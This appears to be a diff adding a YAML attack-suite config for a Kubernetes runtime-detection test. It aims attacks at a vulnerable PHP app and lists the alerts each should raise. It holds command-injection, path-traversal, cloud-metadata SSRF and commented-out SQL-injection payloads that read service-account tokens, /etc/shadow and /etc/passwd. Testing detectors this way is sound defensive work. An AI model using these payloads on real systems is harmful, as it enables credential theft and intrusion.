@@ -1,0 +1,195 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: webapp-attacks
+  description: "CTRL attack suite for the PHP webapp"
+target:
+  service: webapp-mywebapp
+  namespace: webapp
+  port: 8080
+
+attacks:
+  # --- Command Injection (via ping.php) ---
+  - name: cmdinject-sa-token
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+    successIndicators:
+      - bodyContains: "eyJ"
+
+  - name: cmdinject-etc-passwd
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;cat /etc/passwd"
+    successIndicators:
+      - bodyContains: "root:"
+
+  - name: cmdinject-whoami
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;whoami"
+    successIndicators:
+      - bodyContains: "www-data"
+
+  - name: cmdinject-ls-secrets
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
+    successIndicators:
+      - bodyContains: "token"
+
+  # --- Local File Inclusion (via eula.php) ---
+  - name: lfi-sa-token
+    type: lfi
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        eulaPath: "../../../var/run/secrets/kubernetes.io/serviceaccount/token"
+    successIndicators:
+      - bodyContains: "eyJ"
+
+  - name: lfi-etc-shadow
+    type: lfi
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        eulaPath: "../../../../etc/shadow"
+    successIndicators:
+      - bodyContains: "root:"
+
+  - name: lfi-etc-passwd
+    type: lfi
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        eulaPath: "../../../../etc/passwd"
+    successIndicators:
+      - bodyContains: "root:"
+
+  - name: lfi-proc-cpuinfo
+    type: lfi
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        eulaPath: "../../../../proc/cpuinfo"
+    successIndicators:
+      - bodyContains: "processor"
+
+  # --- SSRF (via helper.php) ---
+  - name: ssrf-aws-metadata
+    type: ssrf
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        fetch: "http://169.254.169.254/latest/meta-data/"
+    successIndicators:
+      - bodyContains: "instance-id"
+
+  - name: ssrf-gcp-metadata
+    type: ssrf
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        fetch: "http://metadata.google.internal/computeMetadata/v1/"
+    successIndicators:
+      - bodyContains: "project"
+
+  - name: ssrf-localhost
+    type: ssrf
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        fetch: "http://127.0.0.1:80"
+    successIndicators:
+      - statusCode: 200
+
+  - name: ssrf-google
+    type: ssrf
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        fetch: "http://google.com"
+    successIndicators:
+      - bodyContains: "google"
+
+  # # --- SQL Injection (via login form POST) ---
+  # - name: sqli-auth-bypass
+  #   type: sqli
+  #   http:
+  #     method: POST
+  #     path: /
+  #     formParams:
+  #       username: "admin' OR '1'='1"
+  #       password: "anything"
+  #   successIndicators:
+  #     - bodyContains: "welcome"
+
+  # - name: sqli-union-select
+  #   type: sqli
+  #   http:
+  #     method: POST
+  #     path: /
+  #     formParams:
+  #       username: "admin' UNION SELECT NULL,NULL,NULL--"
+  #       password: "anything"
+  #   successIndicators:
+  #     - bodyContains: "welcome"
+
+  # - name: sqli-tautology
+  #   type: sqli
+  #   http:
+  #     method: POST
+  #     path: /
+  #     formParams:
+  #       username: "' OR '1'='1' --"
+  #       password: "anything"
+  #   successIndicators:
+  #     - bodyContains: "welcome"
+
+expectedDetections:
+  - attackType: cmdinject
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    containerName: mywebapp-app
+    command: cat
+
+  - attackType: cmdinject
+    ruleID: R0006
+    ruleName: "Unexpected Service Account Token Access"
+    containerName: mywebapp-app
+    command: cat
+
+  - attackType: lfi
+    ruleID: R0002
+    ruleName: "Unexpected file access"
+    command: php
+
+  - attackType: lfi
+    ruleID: R0010
+    ruleName: "Unexpected Sensitive File Access"
+    command: php
+
+  - attackType: ssrf
+    ruleID: R0005
+    ruleName: "Unexpected domain request"
+    command: php
